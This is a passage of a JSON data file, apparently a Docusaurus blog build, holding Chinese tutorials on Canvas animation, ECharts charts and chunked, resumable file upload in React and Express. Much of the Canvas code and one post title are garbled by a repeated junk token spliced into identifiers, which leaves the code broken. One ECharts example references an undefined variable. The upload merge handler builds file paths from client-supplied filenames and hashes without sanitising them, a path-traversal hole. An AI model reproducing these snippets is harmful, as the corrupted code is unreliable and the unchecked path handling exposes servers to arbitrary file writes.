\u5e73\u79fb\\nctx.translate(100, 100);\\n\\n// \u65cb\u8f6c (\u5f27\u5ea6)\\nctx.rotate(Math.PI / 4);\\n\\n// \u7f29\u653e\\nctx.scale(2, 2);\\n\\n// \u7ed1\u5b9a\\nctx bindBindBindBindBindBindBindBindBing bindBindBindBindBindBindBindBindBing.bindBindBindBindBindBindBindBindBingfillRect(-25, -25, 50, 50);\\n\\n// \u6062\u590d\u72b6\u6001\\nctx.restore();\\n```\\n\\n---\\n\\n## \ud83c\udfac \u52a8\u753b\\n\\n### \u57fa\u672c\u52a8\u753b\u5faa\u73af\\n\\n```javascript\\nlet x = 0;\\n\\nfunction animate() {\\n  ctx.clearRect(0, 0, canvas.width, canvas.height);\\n  \\n  ctx.fillStyle = \'#3b82f6\';\\n  ctx.fillRect(x, 100, 50, 50);\\n  \\n  x += 2;\\n  if (x > canvas.width) x = -50;\\n  \\n  requestAnimationFrame(animate);\\n}\\n\\nanimate();\\n```\\n\\n### \u5f39\u8df3\u7403\\n\\n```javascript\\nclass Ball {\\n  constructor(x, y, radius, color) {\\n    this.x = x;\\n    this.y = y;\\n    this.radius = radius;\\n    this.color = color;\\n    this.vx = Math.random() * 4 - 2;\\n    this.vy = Math.random() * 4 - 2;\\n  }\\n\\nbindBindBindBindBindBindBindBindBing  draw(ctx) {\\n    ctx.beginPath();\\n    ctx.arc(this.x, this.y, this.radius, 0, Math.PI * 2);\\n    ctx bindBindBindBindBindBindBindBindBing.fillStyle = this.color;\\n    ctx.fill();\\n  }\\n\\n  update(width, height) {\\n    this.x += this.vx;\\n    this.y += this.vy;\\n\\n    if (this.x - this.radius < 0 || this.x + this.radius > width) {\\n      this.vx = -this.vx;\\n    }\\n    if (this.y - this.radius < 0 || this.y + this.radius > height) {\\n      this.vy = -this.vy;\\n    }\\n  }\\n}\\n\\nconst balls = Array.from({ length: 20 }, () => \\n  new Ball(\\n    Math.random() * canvas.width,\\n    Math.random() * canvas.height,\\n    Math.random() * 20 + 10,\\n    `hsl(${Math.random() * 360}, 70%, 50%)`\\n  )\\n);\\n\\nfunction animate() {\\n  ctx.clearRect(0, 0, canvas.width, canvas.height);\\n  \\n  balls.forEach(ball => {\\n    ball.update(canvas.width, canvas.height);\\n    ball.draw(ctx);\\n  });\\n  \\n  requestAnimationFrame(animate);\\n}\\n\\nanimate();\\n```\\n\\n---\\n\\n## \ud83d\uddb1\ufe0f \u4ea4\u4e92\\n\\n```javascript\\ncanvas.bindBindBindBindBindBindBindBindBingaddEventListener(\'click\', (e) => {\\n  const rect = canvas.getBoundingClientRect();\\n  const x = e.clientX - rect.left;\\n  const y = e.clientY - rect.top;\\n  \\n  console.log(\'Click at:\', x, y);\\n});\\n\\n// \u68c0\u6d4b\u70b9\u662f\u5426\u5728\u8def\u5f84\u5185\\ncanvas.addEventListener(\'click\', (e) => {\\n  const rect = canvas.getBoundingClientRect();\\n  const x = e.clientX - rect.left;\\n  const y = e.clientY - rect.top;\\n  \\n  ctx.beginPath();\\n  ctx.arc(100, 100, 50, 0, Math.PI * 2);\\n  \\n  if (ctx.isPointInPath(x, y)) {\\n    console.log(\'Clicked inside circle\');\\n  }\\n});\\n```\\n\\n---\\n\\n## \ud83d\udcf1 React \u5c01\u88c5\\n\\n```tsx\\nimport { useRef, useEffect, useCallback } from \'react\';\\n\\nfunction useCanvas bindBindBindBindBindBindBindBindBing bindBindBindBindBindBindBindBindBing bindBindBindBindBindBindBindBindBing bindBindBindBindBindBindBindBindBing(bindBindBindBindBindBindBindBindBingdraw: (ctx: bindBindBindBindBindBindBindBindBingCanvasRenderingContext2D) => void) {\\n  const canvasRef = useRef<HTMLCanvasElement>(null);\\n\\n  useEffect(() => {\\n    const canvas = canvasRef.current;\\n    if (!canvas) return;\\n\\n    const ctx = canvas.getContext(\'2d\');\\n    if (!ctx) return;\\n\\n    let animationId: number;\\n\\n    const render = () => {\\n      draw(ctx);\\n      animationId = requestAnimationFrame(render);\\n    };\\n\\n    render();\\n\\n    return () => cancelAnimationFrame(animationId);\\n  }, [draw]);\\n\\n  return canvasRef;\\n}\\n\\n// \u4f7f\u7528\\nfunction MyCanvas() {\\n  const draw = useCallback((ctx: CanvasRenderingContext2D) => {\\n    ctx.clearRect(0, 0, ctx.canvas.width, ctx.canvas.height);\\n    ctx.fillStyle = \'#3b82f6\';\\n    ctx.fillRect(50, 50, 100, 100);\\n  }, []);\\n\\n  const canvasRef = useCanvas(bindBindBindBindBindBindBindBindBingdraw);\\n\\n  return <canvas ref={canvasRef} width={800} height={600} />;\\n}\\n```\\n\\n---\\n\\nCanvas \u662f\u5b9e\u73b0\u81ea\u5b9a\u4e49\u56fe\u5f62\u548c\u52a8\u753b\u7684\u5229\u5668\u3002\u638c\u63e1\u57fa\u7840\u540e\uff0c\u53ef\u4ee5\u521b\u9020\u65e0\u9650\u53ef\u80fd\u3002"},{"id":"data-visualization","metadata":{"permalink":"/blog/data-visualization","editUrl":"https://github.com/hweos/git-pages/edit/main/blog/2025-03-25-data-visualization.md","source":"@site/blog/2025-03-25-data-visualization.md","title":"\u6570\u636e\u53ef\u89c6\u5316\u5165\u95e8 (ECharts)","description":"\u6570\u636e\u53ef\u89c6\u5316\u8ba9\u6570\u636e\u66f4\u76f4\u89c2\u6613\u61c2\u3002\u672c\u6587\u4ecb\u7ecd ECharts \u7684\u57fa\u7840\u4f7f\u7528\u548c\u5e38\u89c1\u56fe\u8868\u7c7b\u578b\u3002","date":"2025-03-25T00:00:00.000Z","tags":[{"inline":true,"label":"\u6570\u636e\u53ef\u89c6\u5316","permalink":"/blog/tags/\u6570\u636e\u53ef\u89c6\u5316"},{"inline":true,"label":"ECharts","permalink":"/blog/tags/e-charts"},{"inline":true,"label":"\u524d\u7aef","permalink":"/blog/tags/\u524d\u7aef"}],"readingTime":3.75,"hasTruncateMarker":true,"authors":[{"name":"Mason","title":"Full Stack Developer","url":"https://github.com/HuangZhe007","socials":{"github":"https://github.com/HuangZhe007"},"imageURL":"https://avatars.githubusercontent.com/u/45168628?v=4","key":"mason","page":null}],"frontMatter":{"slug":"data-visualization","title":"\u6570\u636e\u53ef\u89c6\u5316\u5165\u95e8 (ECharts)","authors":"mason","tags":["\u6570\u636e\u53ef\u89c6\u5316","ECharts","\u524d\u7aef"]},"unlisted":false,"prevItem":{"title":"Canvas bindBindBindBindBindBindBindBindBing\u4e0e\u52a8\u753b","permalink":"/blog/canvas-bindbindbindbindbindbindbindbindbing"},"nextItem":{"title":"\u6587\u4ef6\u4e0a\u4f20\u5b8c\u6574\u65b9\u6848","permalink":"/blog/file-upload"}},"content":"\u6570\u636e\u53ef\u89c6\u5316\u8ba9\u6570\u636e\u66f4\u76f4\u89c2\u6613\u61c2\u3002\u672c\u6587\u4ecb\u7ecd ECharts \u7684\u57fa\u7840\u4f7f\u7528\u548c\u5e38\u89c1\u56fe\u8868\u7c7b\u578b\u3002\\n\\n\x3c!--truncate--\x3e\\n\\n## \ud83c\udfaf \u4e3a\u4ec0\u4e48\u9009\u62e9 ECharts\\n\\n| \u7279\u70b9 | \u8bf4\u660e |\\n|------|------|\\n| \u4e30\u5bcc\u7684\u56fe\u8868 | 20+ \u56fe\u8868\u7c7b\u578b |\\n| \u9ad8\u5ea6\u5b9a\u5236 | \u914d\u7f6e\u9879\u5b8c\u5584 |\\n| \u4ea4\u4e92\u6027\u5f3a | \u7f29\u653e\u3001\u62d6\u62fd\u3001\u63d0\u793a |\\n| \u6027\u80fd\u4f18\u79c0 | Canvas/SVG \u6e32\u67d3 |\\n| \u79fb\u52a8\u7aef\u53cb\u597d | \u54cd\u5e94\u5f0f\u8bbe\u8ba1 |\\n\\n---\\n\\n## \ud83d\ude80 \u5feb\u901f\u5f00\u59cb\\n\\n### \u5b89\u88c5\\n\\n```bash\\nnpm install echarts\\n```\\n\\n### \u57fa\u7840\u4f7f\u7528\\n\\n```tsx\\nimport * as echarts from \'echarts\';\\nimport { useEffect, useRef } from \'react\';\\n\\nfunction Chart() {\\n  const chartRef = useRef<HTMLDivElement>(null);\\n\\n  useEffect(() => {\\n    if (!chartRef.current) return;\\n\\n    const chart = echarts.init(chartRef.current);\\n\\n    const option = {\\n      title: { text: \'\u9500\u552e\u6570\u636e\' },\\n      xAxis: {\\n        type: \'category\',\\n        data: [\'Mon\', \'Tue\', \'Wed\', \'Thu\', \'Fri\'],\\n      },\\n      yAxis: { type: \'value\' },\\n      series: [\\n        {\\n          data: [120, 200, 150, 80, 70],\\n          type: \'bar\',\\n        },\\n      ],\\n    };\\n\\n    chart.setOption(option);\\n\\n    // \u54cd\u5e94\u5f0f\\n    const handleResize = () => chart.resize();\\n    window.addEventListener(\'resize\', handleResize);\\n\\n    return () => {\\n      window.removeEventListener(\'resize\', handleResize);\\n      chart.dispose();\\n    };\\n  }, []);\\n\\n  return <div ref={chartRef} style={{ width: \'100%\', height: 400 }} />;\\n}\\n```\\n\\n---\\n\\n## \ud83d\udcca \u5e38\u89c1\u56fe\u8868\\n\\n### \u6298\u7ebf\u56fe\\n\\n```javascript\\nconst option = {\\n  title: { text: \'\u8bbf\u95ee\u8d8b\u52bf\' },\\n  tooltip: { trigger: \'axis\' },\\n  legend: { data: [\'PV\', \'UV\'] },\\n  xAxis: {\\n    type: \'category\',\\n    data: [\'\u5468\u4e00\', \'\u5468\u4e8c\', \'\u5468\u4e09\', \'\u5468\u56db\', \'\u5468\u4e94\', \'\u5468\u516d\', \'\u5468\u65e5\'],\\n  },\\n  yAxis: { type: \'value\' },\\n  series: [\\n    {\\n      name: \'PV\',\\n      type: \'line\',\\n      data: [820, 932, 901, 934, 1290, 1330, 1320],\\n      smooth: true,\\n    },\\n    {\\n      name: \'UV\',\\n      type: \'line\',\\n      data: [120, 132, 101, 134, 90, 230, 210],\\n      smooth: true,\\n    },\\n  ],\\n};\\n```\\n\\n### \u67f1\u72b6\u56fe\\n\\n```javascript\\nconst option = {\\n  title: { text: \'\u5b63\u5ea6\u9500\u552e\' },\\n  tooltip: {},\\n  xAxis: {\\n    type: \'category\',\\n    data: [\'Q1\', \'Q2\', \'Q3\', \'Q4\'],\\n  },\\n  yAxis: { type: \'value\' },\\n  series: [\\n    {\\n      name: \'2023\',\\n      type: \'bar\',\\n      data: [500, 800, 600, 900],\\n      itemStyle: { color: \'#3b82f6\' },\\n    },\\n    {\\n      name: \'2024\',\\n      type: \'bar\',\\n      data: [600, 950, 750, 1100],\\n      itemStyle: { color: \'#10b981\' },\\n    },\\n  ],\\n};\\n```\\n\\n### \u997c\u56fe\\n\\n```javascript\\nconst option = {\\n  title: {\\n    text: \'\u6d41\u91cf\u6765\u6e90\',\\n    left: \'center\',\\n  },\\n  tooltip: {\\n    trigger: \'item\',\\n    formatter: \'{b}: {c} ({d}%)\',\\n  },\\n  legend: {\\n    orient: \'vertical\',\\n    left: \'left\',\\n  },\\n  series: [\\n    {\\n      type: \'pie\',\\n      radius: \'50%\',\\n      data: [\\n        { value: 1048, name: \'\u641c\u7d22\u5f15\u64ce\' },\\n        { value: 735, name: \'\u76f4\u63a5\u8bbf\u95ee\' },\\n        { value: 580, name: \'\u90ae\u4ef6\u8425\u9500\' },\\n        { value: 484, name: \'\u8054\u76df\u5e7f\u544a\' },\\n        { value: 300, name: \'\u89c6\u9891\u5e7f\u544a\' },\\n      ],\\n      emphasis: {\\n        itemStyle: {\\n          shadowBlur: 10,\\n          shadowOffsetX: 0,\\n          shadowColor: \'rgba(0, 0, 0, 0.5)\',\\n        },\\n      },\\n    },\\n  ],\\n};\\n```\\n\\n### \u73af\u5f62\u56fe\\n\\n```javascript\\nconst option = {\\n  series: [\\n    {\\n      type: \'pie\',\\n      radius: [\'40%\', \'70%\'],  // \u5185\u5916\u534a\u5f84\\n      avoidLabelOverlap: false,\\n      label: {\\n        show: false,\\n        position: \'center\',\\n      },\\n      emphasis: {\\n        label: {\\n          show: true,\\n          fontSize: 24,\\n          fontWeight: \'bold\',\\n        },\\n      },\\n      labelLine: { show: false },\\n      data: [\\n        { value: 1048, name: \'\u641c\u7d22\u5f15\u64ce\' },\\n        { value: 735, name: \'\u76f4\u63a5\u8bbf\u95ee\' },\\n        { value: 580, name: \'\u90ae\u4ef6\u8425\u9500\' },\\n      ],\\n    },\\n  ],\\n};\\n```\\n\\n### \u96f7\u8fbe\u56fe\\n\\n```javascript\\nconst option = {\\n  radar: {\\n    indicator: [\\n      { name: \'\u9500\u552e\', max: 100 },\\n      { name: \'\u7ba1\u7406\', max: 100 },\\n      { name: \'\u6280\u672f\', max: 100 },\\n      { name: \'\u5ba2\u670d\', max: 100 },\\n      { name: \'\u7814\u53d1\', max: 100 },\\n      { name: \'\u5e02\u573a\', max: 100 },\\n    ],\\n  },\\n  series: [\\n    {\\n      type: \'radar\',\\n      data: [\\n        {\\n          value: [80, 90, 70, 60, 85, 75],\\n          name: \'\u56e2\u961fA\',\\n        },\\n        {\\n          value: [60, 70, 80, 90, 65, 85],\\n          name: \'\u56e2\u961fB\',\\n        },\\n      ],\\n    },\\n  ],\\n};\\n```\\n\\n---\\n\\n## \ud83c\udfa8 \u6837\u5f0f\u914d\u7f6e\\n\\n### \u4e3b\u9898\\n\\n```javascript\\n// \u4f7f\u7528\u5185\u7f6e\u4e3b\u9898\\necharts.init(dom, \'dark\');\\n\\n// \u81ea\u5b9a\u4e49\u4e3b\u9898\\necharts.registerTheme(\'myTheme\', {\\n  color: [\'#3b82f6\', \'#10b981\', \'#f59e0b\', \'#ef4444\'],\\n  backgroundColor: \'#f8fafc\',\\n});\\necharts.init(dom, \'myTheme\');\\n```\\n\\n### \u989c\u8272\u914d\u7f6e\\n\\n```javascript\\nconst option = {\\n  color: [\'#5470c6\', \'#91cc75\', \'#fac858\', \'#ee6666\'],\\n  series: [\\n    {\\n      type: \'bar\',\\n      itemStyle: {\\n        color: (params) => {\\n          const colors = [\'#5470c6\', \'#91cc75\', \'#fac858\'];\\n          return colors[params.dataIndex % colors.length];\\n        },\\n      },\\n    },\\n  ],\\n};\\n```\\n\\n### \u6e10\u53d8\u8272\\n\\n```javascript\\nconst option = {\\n  series: [\\n    {\\n      type: \'bar\',\\n      itemStyle: {\\n        color: new echarts.graphic.LinearGradient(0, 0, 0, 1, [\\n          { offset: 0, color: \'#83bff6\' },\\n          { offset: 0.5, color: \'#188df0\' },\\n          { offset: 1, color: \'#188df0\' },\\n        ]),\\n      },\\n    },\\n  ],\\n};\\n```\\n\\n---\\n\\n## \ud83d\udd27 \u4ea4\u4e92\u914d\u7f6e\\n\\n### Tooltip\\n\\n```javascript\\nconst option = {\\n  tooltip: {\\n    trigger: \'axis\',  // \'item\' | \'axis\' | \'none\'\\n    axisPointer: {\\n      type: \'cross\',  // \'line\' | \'shadow\' | \'cross\'\\n    },\\n    formatter: (params) => {\\n      return `${params[0].name}: ${params[0].value}`;\\n    },\\n  },\\n};\\n```\\n\\n### Legend\\n\\n```javascript\\nconst option = {\\n  legend: {\\n    type: \'scroll\',  // \u53ef\u6eda\u52a8\\n    orient: \'vertical\',\\n    right: 10,\\n    top: 20,\\n    bottom: 20,\\n    data: [\'\u7cfb\u52171\', \'\u7cfb\u52172\', \'\u7cfb\u52173\'],\\n    selected: {\\n      \'\u7cfb\u52171\': true,\\n      \'\u7cfb\u52172\': false,  // \u9ed8\u8ba4\u4e0d\u9009\u4e2d\\n    },\\n  },\\n};\\n```\\n\\n### \u6570\u636e\u7f29\u653e\\n\\n```javascript\\nconst option = {\\n  dataZoom: [\\n    {\\n      type: \'slider\',\\n      show: true,\\n      start: 0,\\n      end: 100,\\n    },\\n    {\\n      type: \'inside\',  // \u9f20\u6807\u6eda\u8f6e\u7f29\u653e\\n      start: 0,\\n      end: 100,\\n    },\\n  ],\\n};\\n```\\n\\n---\\n\\n## \ud83d\udcf1 \u54cd\u5e94\u5f0f\\n\\n```typescript\\nfunction useChart(option: any) {\\n  const chartRef = useRef<HTMLDivElement>(null);\\n  const chartInstance = useRef<echarts.ECharts>();\\n\\n  useEffect(() => {\\n    if (!chartRef.current) return;\\n\\n    chartInstance.current = echarts.init(chartRef.current);\\n    chartInstance.current.setOption(option);\\n\\n    const resizeObserver = new ResizeObserver(() => {\\n      chartInstance.current?.resize();\\n    });\\n    resizeObserver.observe(chartRef.current);\\n\\n    return () => {\\n      resizeObserver.disconnect();\\n      chartInstance.current?.dispose();\\n    };\\n  }, [option]);\\n\\n  return { chartRef, chart: chartInstance.current };\\n}\\n```\\n\\n---\\n\\n## \ud83d\udce6 \u6309\u9700\u5f15\u5165\\n\\n```javascript\\n// \u51cf\u5c0f\u5305\u4f53\u79ef\\nimport * as echarts from \'echarts/core\';\\nimport { BarChart, LineChart, PieChart } from \'echarts/charts\';\\nimport {\\n  TitleComponent,\\n  TooltipComponent,\\n  GridComponent,\\n  LegendComponent,\\n} from \'echarts/components\';\\nimport { CanvasRenderer } from \'echarts/renderers\';\\n\\necharts.use([\\n  BarChart,\\n  LineChart,\\n  PieChart,\\n  TitleComponent,\\n  TooltipComponent,\\n  GridComponent,\\n  LegendComponent,\\n  CanvasRenderer,\\n]);\\n```\\n\\n---\\n\\n## \ud83d\udd04 \u52a8\u6001\u6570\u636e\\n\\n```typescript\\nfunction RealTimeChart() {\\n  const chartRef = useRef<echarts.ECharts>();\\n  const [data, setData] = useState<number[]>([]);\\n\\n  useEffect(() => {\\n    const interval = setInterval(() => {\\n      const newValue = Math.random() * 100;\\n      setData((prev) => [...prev.slice(-19), newValue]);\\n    }, 1000);\\n\\n    return () => clearInterval(interval);\\n  }, []);\\n\\n  useEffect(() => {\\n    chartRef.current?.setOption({\\n      series: [{ data }],\\n    });\\n  }, [data]);\\n\\n  return <div ref={bindChart} style={{ height: 400 }} />;\\n}\\n```\\n\\n---\\n\\n## \ud83d\udccb \u63a8\u8350\u8d44\u6e90\\n\\n- [ECharts \u5b98\u65b9\u6587\u6863](https://echarts.apache.org/)\\n- [ECharts \u793a\u4f8b](https://echarts.apache.org/examples/)\\n- [Make A Pie](https://www.makeapie.cn/) - \u793e\u533a\u4f5c\u54c1\\n\\n---\\n\\n\u6570\u636e\u53ef\u89c6\u5316\u7684\u5173\u952e\u662f\u9009\u62e9\u6b63\u786e\u7684\u56fe\u8868\u7c7b\u578b\uff0c\u8ba9\u6570\u636e\u8bb2\u6545\u4e8b\u3002"},{"id":"file-upload","metadata":{"permalink":"/blog/file-upload","editUrl":"https://github.com/hweos/git-pages/edit/main/blog/2025-03-10-file-upload.md","source":"@site/blog/2025-03-10-file-upload.md","title":"\u6587\u4ef6\u4e0a\u4f20\u5b8c\u6574\u65b9\u6848","description":"\u6587\u4ef6\u4e0a\u4f20\u662f Web \u5f00\u53d1\u4e2d\u7684\u5e38\u89c1\u9700\u6c42\u3002\u672c\u6587\u4ecb\u7ecd\u6587\u4ef6\u4e0a\u4f20\u7684\u5b8c\u6574\u5b9e\u73b0\u65b9\u6848\uff0c\u5305\u62ec\u5927\u6587\u4ef6\u5206\u7247\u3001\u65ad\u70b9\u7eed\u4f20\u7b49\u3002","date":"2025-03-10T00:00:00.000Z","tags":[{"inline":true,"label":"\u6587\u4ef6\u4e0a\u4f20","permalink":"/blog/tags/\u6587\u4ef6\u4e0a\u4f20"},{"inline":true,"label":"\u524d\u7aef","permalink":"/blog/tags/\u524d\u7aef"},{"inline":true,"label":"\u540e\u7aef","permalink":"/blog/tags/\u540e\u7aef"}],"readingTime":4.53,"hasTruncateMarker":true,"authors":[{"name":"Mason","title":"Full Stack Developer","url":"https://github.com/HuangZhe007","socials":{"github":"https://github.com/HuangZhe007"},"imageURL":"https://avatars.githubusercontent.com/u/45168628?v=4","key":"mason","page":null}],"frontMatter":{"slug":"file-upload","title":"\u6587\u4ef6\u4e0a\u4f20\u5b8c\u6574\u65b9\u6848","authors":"mason","tags":["\u6587\u4ef6\u4e0a\u4f20","\u524d\u7aef","\u540e\u7aef"]},"unlisted":false,"prevItem":{"title":"\u6570\u636e\u53ef\u89c6\u5316\u5165\u95e8 (ECharts)","permalink":"/blog/data-visualization"},"nextItem":{"title":"\u56fd\u9645\u5316 (i18n) \u6700\u4f73\u5b9e\u8df5","permalink":"/blog/i18n-guide"}},"content":"\u6587\u4ef6\u4e0a\u4f20\u662f Web \u5f00\u53d1\u4e2d\u7684\u5e38\u89c1\u9700\u6c42\u3002\u672c\u6587\u4ecb\u7ecd\u6587\u4ef6\u4e0a\u4f20\u7684\u5b8c\u6574\u5b9e\u73b0\u65b9\u6848\uff0c\u5305\u62ec\u5927\u6587\u4ef6\u5206\u7247\u3001\u65ad\u70b9\u7eed\u4f20\u7b49\u3002\\n\\n\x3c!--truncate--\x3e\\n\\n## \ud83c\udfaf \u4e0a\u4f20\u65b9\u5f0f\\n\\n| \u65b9\u5f0f | \u9002\u7528\u573a\u666f | \u590d\u6742\u5ea6 |\\n|------|---------|--------|\\n| \u666e\u901a\u4e0a\u4f20 | \u5c0f\u6587\u4ef6 | \u4f4e |\\n| \u5206\u7247\u4e0a\u4f20 | \u5927\u6587\u4ef6 | \u4e2d |\\n| \u65ad\u70b9\u7eed\u4f20 | \u5927\u6587\u4ef6\u3001\u7f51\u7edc\u4e0d\u7a33 | \u9ad8 |\\n| \u79d2\u4f20 | \u5df2\u5b58\u5728\u6587\u4ef6 | \u4e2d |\\n\\n---\\n\\n## \ud83d\udce4 \u57fa\u7840\u4e0a\u4f20\\n\\n### \u524d\u7aef\\n\\n```tsx\\nfunction FileUpload() {\\n  const [file, setFile] = useState<File | null>(null);\\n  const [progress, setProgress] = useState(0);\\n\\n  const handleUpload = async () => {\\n    if (!file) return;\\n\\n    const formData = new FormData();\\n    formData.append(\'file\', file);\\n\\n    const xhr = new XMLHttpRequest();\\n    \\n    xhr.upload.onprogress = (e) => {\\n      if (e.lengthComputable) {\\n        setProgress(Math.round((e.loaded / e.total) * 100));\\n      }\\n    };\\n\\n    xhr.onload = () => {\\n      if (xhr.status === 200) {\\n        console.log(\'\u4e0a\u4f20\u6210\u529f\');\\n      }\\n    };\\n\\n    xhr.open(\'POST\', \'/api/upload\');\\n    xhr.send(formData);\\n  };\\n\\n  return (\\n    <div>\\n      <input\\n        type=\\"file\\"\\n        onChange={(e) => setFile(e.target.files?.[0] || null)}\\n      />\\n      <button onClick={handleUpload}>\u4e0a\u4f20</button>\\n      <progress value={progress} max=\\"100\\" />\\n    </div>\\n  );\\n}\\n```\\n\\n### \u4f7f\u7528 fetch\\n\\n```typescript\\nasync function uploadFile(file: File) {\\n  const formData = new FormData();\\n  formData.append(\'file\', file);\\n\\n  const response = await fetch(\'/api/upload\', {\\n    method: \'POST\',\\n    body: formData,\\n  });\\n\\n  return response.json();\\n}\\n```\\n\\n### \u540e\u7aef (Node.js)\\n\\n```javascript\\nimport express from \'express\';\\nimport multer from \'multer\';\\n\\nconst upload = multer({\\n  dest: \'uploads/\',\\n  limits: { fileSize: 10 * 1024 * 1024 }, // 10MB\\n  fileFilter: (req, file, cb) => {\\n    const allowedTypes = [\'image/jpeg\', \'image/png\', \'image/gif\'];\\n    if (allowedTypes.includes(file.mimetype)) {\\n      cb(null, true);\\n    } else {\\n      cb(new Error(\'Invalid file type\'));\\n    }\\n  },\\n});\\n\\napp.post(\'/api/upload\', upload.single(\'file\'), (req, res) => {\\n  res.json({\\n    filename: req.file.filename,\\n    size: req.file.size,\\n    path: req.file.path,\\n  });\\n});\\n```\\n\\n---\\n\\n## \ud83d\udcca \u5206\u7247\u4e0a\u4f20\\n\\n### \u524d\u7aef\u5b9e\u73b0\\n\\n```typescript\\nconst CHUNK_SIZE = 5 * 1024 * 1024; // 5MB\\n\\nasync function uploadLargeFile(file: File) {\\n  const chunks = Math.ceil(file.size / CHUNK_SIZE);\\n  const fileHash = await calculateHash(file);\\n\\n  for (let i = 0; i < chunks; i++) {\\n    const start = i * CHUNK_SIZE;\\n    const end = Math.min(start + CHUNK_SIZE, file.size);\\n    const chunk = file.slice(start, end);\\n\\n    const formData = new FormData();\\n    formData.append(\'chunk\', chunk);\\n    formData.append(\'hash\', fileHash);\\n    formData.append(\'index\', String(i));\\n    formData.append(\'total\', String(chunks));\\n    formData.append(\'filename\', file.name);\\n\\n    await fetch(\'/api/upload/chunk\', {\\n      method: \'POST\',\\n      body: formData,\\n    });\\n\\n    console.log(`Uploaded chunk ${i + 1}/${chunks}`);\\n  }\\n\\n  // \u5408\u5e76\u5206\u7247\\n  await fetch(\'/api/upload/merge\', {\\n    method: \'POST\',\\n    headers: { \'Content-Type\': \'application/json\' },\\n    body: JSON.stringify({\\n      hash: fileHash,\\n      filename: file.name,\\n      total: chunks,\\n    }),\\n  });\\n}\\n\\n// \u8ba1\u7b97\u6587\u4ef6 hash\\nasync function calculateHash(file: File): Promise<string> {\\n  const buffer = await file.arrayBuffer();\\n  const hashBuffer = await crypto.subtle.digest(\'SHA-256\', buffer);\\n  const hashArray = Array.from(new Uint8Array(hashBuffer));\\n  return hashArray.map(b => b.toString(16).padStart(2, \'0\')).join(\'\');\\n}\\n```\\n\\n### \u5e76\u53d1\u4e0a\u4f20\\n\\n```typescript\\nasync function uploadWithConcurrency(file: File, concurrency = 3) {\\n  const chunks = createChunks(file);\\n  const fileHash = await calculateHash(file);\\n  \\n  let current = 0;\\n  const results: Promise<void>[] = [];\\n\\n  const uploadNext = async () => {\\n    if (current >= chunks.length) return;\\n    \\n    const index = current++;\\n    const chunk = chunks[index];\\n    \\n    await uploadChunk(chunk, fileHash, index, chunks.length);\\n    await uploadNext();\\n  };\\n\\n  for (let i = 0; i < concurrency; i++) {\\n    results.push(uploadNext());\\n  }\\n\\n  await Promise.all(results);\\n  await mergeChunks(fileHash, file.name, chunks.length);\\n}\\n```\\n\\n### \u540e\u7aef\u5408\u5e76\\n\\n```javascript\\nimport fs from \'fs\';\\nimport path from \'path\';\\n\\napp.post(\'/api/upload/chunk\', upload.single(\'chunk\'), (req, res) => {\\n  const { hash, index } = req.body;\\n  const chunkDir = path.join(\'uploads\', hash);\\n  \\n  if (!fs.existsSync(chunkDir)) {\\n    fs.mkdirSync(chunkDir, { recursive: true });\\n  }\\n  \\n  fs.renameSync(req.file.path, path.join(chunkDir, index));\\n  res.json({ success: true });\\n});\\n\\napp.post(\'/api/upload/merge\', async (req, res) => {\\n  const { hash, filename, total } = req.body;\\n  const chunkDir = path.join(\'uploads\', hash);\\n  const filePath = path.join(\'uploads\', filename);\\n  \\n  const writeStream = fs.createWriteStream(filePath);\\n  \\n  for (let i = 0; i < total; i++) {\\n    const chunkPath = path.join(chunkDir, String(i));\\n    const data = fs.readFileSync(chunkPath);\\n    writeStream.write(data);\\n    fs.unlinkSync(chunkPath);\\n  }\\n  \\n  writeStream.end();\\n  fs.rmdirSync(chunkDir);\\n  \\n  res.json({ success: true, path: filePath });\\n});\\n```\\n\\n---\\n\\n## \ud83d\udd04 \u65ad\u70b9\u7eed\u4f20\\n\\n### \u524d\u7aef\\n\\n```typescript\\nasync function resumableUpload(file: File) {\\n  const fileHash = await calculateHash(file);\\n  const chunks = createChunks(file);\\n\\n  // \u67e5\u8be2\u5df2\u4e0a\u4f20\u5206\u7247\\n  const { uploaded } = await fetch(`/api/upload/status?hash=${fileHash}`)\\n    .then(res => res.json());\\n\\n  for (let i = 0; i < chunks.length; i++) {\\n    // \u8df3\u8fc7\u5df2\u4e0a\u4f20\\n    if (uploaded.includes(i)) continue;\\n\\n    await uploadChunk(chunks[i], fileHash, i, chunks.length);\\n  }\\n\\n  await mergeChunks(fileHash, file.name, chunks.length);\\n}\\n```\\n\\n### \u540e\u7aef\u72b6\u6001\u67e5\u8be2\\n\\n```javascript\\napp.get(\'/api/upload/status\', (req, res) => {\\n  const { hash } = req.query;\\n  const chunkDir = path.join(\'uploads\', hash);\\n  \\n  if (!fs.existsSync(chunkDir)) {\\n    return res.json({ uploaded: [] });\\n  }\\n  \\n  const uploaded = fs.readdirSync(chunkDir)\\n    .map(name => parseInt(name))\\n    .sort((a, b) => a - b);\\n  \\n  res.json({ uploaded });\\n});\\n```\\n\\n---\\n\\n## \u26a1 \u79d2\u4f20\\n\\n```typescript\\nasync function quickUpload(file: File) {\\n  const fileHash = await calculateHash(file);\\n\\n  // \u68c0\u67e5\u662f\u5426\u5df2\u5b58\u5728\\n  const { exists, url } = await fetch(`/api/upload/check?hash=${fileHash}`)\\n    .then(res => res.json());\\n\\n  if (exists) {\\n    console.log(\'\u79d2\u4f20\u6210\u529f\');\\n    return url;\\n  }\\n\\n  // \u6b63\u5e38\u4e0a\u4f20\\n  return await uploadLargeFile(file);\\n}\\n```\\n\\n```javascript\\n// \u540e\u7aef\\napp.get(\'/api/upload/check\', (req, res) => {\\n  const { hash } = req.query;\\n  const file = db.files.findByHash(hash);\\n  \\n  if (file) {\\n    res.json({ exists: true, url: file.url });\\n  } else {\\n    res.json({ exists: false });\\n  }\\n});\\n```\\n\\n---\\n\\n## \ud83d\uddbc\ufe0f \u56fe\u7247\u538b\u7f29\\n\\n```typescript\\nfunction compressImage(file: File, maxWidth = 1920, quality = 0.8): Promise<Blob> {\\n  return new Promise((resolve) => {\\n    const img = new Image();\\n    const canvas = document.createElement(\'canvas\');\\n    const ctx = canvas.getContext(\'2d\')!;\\n\\n    img.onload = () => {\\n      let { width, height } = img;\\n\\n      if (width > maxWidth) {\\n        height = (maxWidth / width) * height;\\n        width = maxWidth;\\n      }\\n\\n      canvas.width = width;\\n      canvas.height = height;\\n      ctx.drawImage(img, 0, 0, width, height);\\n\\n      canvas.toBlob(\\n        (blob) => resolve(blob!),\\n        \'image/jpeg\',\\n        quality\\n      );\\n    };\\n\\n    img.src = URL.createObjectURL(file);\\n  });\\n}\\n```\\n\\n---\\n\\n## \ud83c\udfa8 